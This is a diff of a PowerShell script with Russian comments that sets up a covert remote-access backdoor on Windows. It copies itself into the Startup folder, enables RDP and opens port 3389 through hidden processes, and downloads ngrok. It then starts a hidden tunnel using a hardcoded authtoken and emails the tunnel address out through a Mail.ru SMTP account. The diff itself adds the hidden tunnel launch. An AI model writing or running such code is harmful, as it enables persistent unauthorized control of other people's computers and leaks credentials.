@@ -1,18 +1,17 @@
 Start-Sleep -Seconds 10  # Подождать появления сети
 
-# Функция логирования
+# === Логирование ===
 $logFile = "$env:TEMP\ngrok_log.txt"
 function Log($msg) {
     "[$(Get-Date -Format s)] $msg" | Out-File -FilePath $logFile -Append
 }
-
 Log "=== Скрипт стартовал ==="
 
-# Путь текущего скрипта
+# === Путь текущего скрипта ===
 $thisScript = $MyInvocation.MyCommand.Path
 Log "Текущий скрипт: $thisScript"
 
-# Автозапуск
+# === Копирование в автозагрузку ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
 if ($thisScript -ne $startupPath -and -not (Test-Path $startupPath)) {
     Copy-Item -Path $thisScript -Destination $startupPath -Force
@@ -20,7 +19,7 @@ if ($thisScript -ne $startupPath -and -not (Test-Path $startupPath)) {
     exit
 }
 
-# Включаем RDP
+# === Включаем RDP ===
 try {
     Start-Process reg.exe -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb RunAs -WindowStyle Hidden | Out-Null
     Log "RDP включён"
@@ -28,7 +27,7 @@ try {
     Log "Ошибка при включении RDP: $_"
 }
 
-# Открываем порт 3389
+# === Открываем порт 3389 в Firewall ===
 try {
     Start-Process netsh -ArgumentList 'advfirewall firewall add rule name="ngrok RDP" dir=in action=allow protocol=TCP localport=3389' -WindowStyle Hidden | Out-Null
     Log "Firewall правило добавлено"
@@ -36,7 +35,7 @@ try {
     Log "Ошибка при добавлении правила брандмауэра: $_"
 }
 
-# Установка ngrok
+# === Скачивание и установка ngrok ===
 $ngrokDir = "$env:APPDATA\ngrok"
 $ngrokExe = Join-Path $ngrokDir "ngrok.exe"
 $tempZip  = "$env:TEMP\ngrok.zip"
@@ -53,23 +52,35 @@ if (-not (Test-Path $ngrokExe)) {
     Log "Ngrok уже установлен"
 }
 
-$ngrokConfigDir = "$env:APPDATA\ngrok"
-$ngrokConfig = "$ngrokConfigDir\ngrok.yml"
+# === Создание конфигурации ngrok ===
+$ngrokConfig = "$ngrokDir\ngrok.yml"
 
-if (!(Test-Path $ngrokConfig)) {
-    if (!(Test-Path $ngrokConfigDir)) {
-        New-Item -ItemType Directory -Path $ngrokConfigDir -Force | Out-Null
-    }
-
-    @"
+if (-not (Test-Path $ngrokConfig)) {
+    try {
+        @"
 authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
 tunnels:
   rdp:
     addr: 3389
     proto: tcp
-"@ | Out-File -Encoding ASCII $ngrokConfig
+"@ | Out-File -Encoding ASCII -FilePath $ngrokConfig
+        Log "Файл конфигурации ngrok создан: $ngrokConfig"
+    } catch {
+        Log "Ошибка при создании ngrok.yml: $_"
+    }
+} else {
+    Log "Конфиг ngrok уже существует"
 }
 
+# === Запуск туннеля ===
+try {
+    Start-Process -FilePath $ngrokExe -ArgumentList "start --config `"$ngrokConfig`" rdp" -WindowStyle Hidden
+    Log "Ngrok запущен"
+} catch {
+    Log "Ошибка при запуске ngrok: $_"
+}
+
+# === Ожидание появления tunnelAddress ===
 $tunnelAddress = $null
 for ($i = 0; $i -lt 30; $i++) {
     try {
@@ -88,7 +99,7 @@ if (-not $tunnelAddress) {
     Log "Не удалось получить tunnelAddress"
 }
 
-# Параметры Mail.ru SMTP
+# === Отправка письма через Mail.ru ===
 $smtpServer = "smtp.mail.ru"
 $smtpPort   = 587
 $smtpUser   = "user.default00@mail.ru"
@@ -103,7 +114,6 @@ $body = if ($tunnelAddress) {
     "ERROR: ngrok tunnel not obtained"
 }
 
-# Отправка письма
 try {
     Log "Попытка отправки email"
     $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
